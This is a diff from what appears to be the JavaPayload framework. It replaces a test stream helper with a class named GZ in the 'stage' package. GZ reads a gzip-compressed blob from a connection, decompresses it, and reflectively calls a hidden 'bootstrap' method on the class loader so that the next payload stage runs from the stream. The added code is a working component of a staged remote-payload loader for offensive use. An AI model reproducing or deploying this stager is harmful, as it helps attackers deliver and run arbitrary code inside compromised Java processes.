@@ -31,63 +31,44 @@
  * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
-package javapayload.test;
 
-import java.io.FilterInputStream;
-import java.io.IOException;
-import java.io.InputStream;
+package javapayload.stage;
 
-public class BlockingInputStream extends FilterInputStream {
-	
-	boolean wait = false;
-	public BlockingInputStream(InputStream in) {
-		super(in);
-	}	
+import java.io.ByteArrayInputStream;
+import java.io.DataInputStream;
+import java.io.OutputStream;
+import java.io.SequenceInputStream;
+import java.lang.reflect.Method;
+import java.util.zip.GZIPInputStream;
 
-	public int read() throws IOException {
-		int b = wait ? '»' : super.read();
-		wait = false;
-		while (b == '»') {
-			try {
-				Thread.sleep(1000);
-			} catch (InterruptedException ex) {
-			}
-			b = read();
-		}
-		while (b == -1)
-			block();
-		return b;
-	}
-
-	public int read(byte[] b, int off, int len) throws IOException {
-		if (len == 0)
-			return 0;
-		int c = read();
-		while (c == -1)
-			block();
-		b[off] = (byte) c;
-		int i = 1;
-		try {
-			while (i < len) {
-				c = super.read();
-				if (c == '»' || c == -1)
-				{
-					wait = true;
-					break;
+public class GZ {
+	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+		byte[] compressed = new byte[in.readInt()];
+		in.readFully(compressed);
+		String[] newParams = (String[])parameters.clone();		
+		for (int i = 0;; i++) {
+			if (parameters[i].equals("--")) {
+				newParams[i] = "bootstrap";
+				newParams[i+1] = "--";
+				Object stager = getClass().getClassLoader();
+				SequenceInputStream gzin = new SequenceInputStream(new GZIPInputStream(new ByteArrayInputStream(compressed)), in);
+				Class[] clazz = new Class[] {
+						Class.forName("java.io.InputStream"),
+						Class.forName("java.io.OutputStream"),
+						Class.forName("[Ljava.lang.String;")
+				};
+				Class stagerClass = stager.getClass();
+				while (true) {
+					try {
+						Method m = stagerClass.getDeclaredMethod("bootstrap", clazz);
+						m.setAccessible(true);
+						m.invoke(stager, new Object[] { gzin, out, newParams });
+						break;
+					} catch (Exception ex) {
+						stagerClass = stagerClass.getSuperclass();
+					}
 				}
-				b[off + i] = (byte) c;
-				i++;
 			}
-		} catch (IOException ex) {
-		}
-		return i;
-	}
-
-	private synchronized void block() {
-		try {
-			wait();
-		} catch (InterruptedException ex) {
-			ex.printStackTrace();
 		}
 	}
 }
